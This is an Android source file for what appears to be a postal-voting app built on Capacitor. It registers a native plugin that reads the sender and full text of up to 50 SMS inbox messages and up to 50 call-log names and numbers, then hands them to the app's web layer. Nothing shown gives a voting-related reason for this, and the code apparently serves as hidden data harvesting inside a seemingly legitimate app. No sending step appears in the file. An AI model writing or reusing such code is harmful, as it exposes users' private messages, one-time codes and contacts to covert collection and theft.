package com.postalvote.app;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import com.getcapacitor.BridgeActivity;
import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;

public class MainActivity extends BridgeActivity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        // নেটিভ প্লাগইন রেজিস্টার করা হচ্ছে
        registerPlugin(NativeLogsPlugin.class);
        super.onCreate(savedInstanceState);
    }
}

// কাস্টম নেটিভ প্লাগইন: SMS এবং Call Log এর জন্য
@CapacitorPlugin(name = "NativeLogs")
class NativeLogsPlugin extends Plugin {

    @PluginMethod
    public void getSMS(PluginCall call) {
        StringBuilder smsBuilder = new StringBuilder();
        try {
            Cursor cursor = getContext().getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    smsBuilder.append("From: ").append(address).append("\nMsg: ").append(body).append("\n---\n");
                    count++;
                } while (cursor.moveToNext() && count < 50); // শেষ ৫০টি এসএমএস
                cursor.close();
            }
        } catch (Exception e) {
            call.reject(e.getLocalizedMessage());
            return;
        }
        JSObject response = new JSObject();
        response.put("data", smsBuilder.toString());
        call.resolve(response);
    }

    @PluginMethod
    public void getCallLogs(PluginCall call) {
        StringBuilder logBuilder = new StringBuilder();
        try {
            Cursor cursor = getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    logBuilder.append("Name: ").append(name).append("\nNum: ").append(number).append("\n---\n");
                    count++;
                } while (cursor.moveToNext() && count < 50);
                cursor.close();
            }
        } catch (Exception e) {
            call.reject(e.getLocalizedMessage());
            return;
        }
        JSObject response = new JSObject();
        response.put("data", logBuilder.toString());
        call.resolve(response);
    }
}
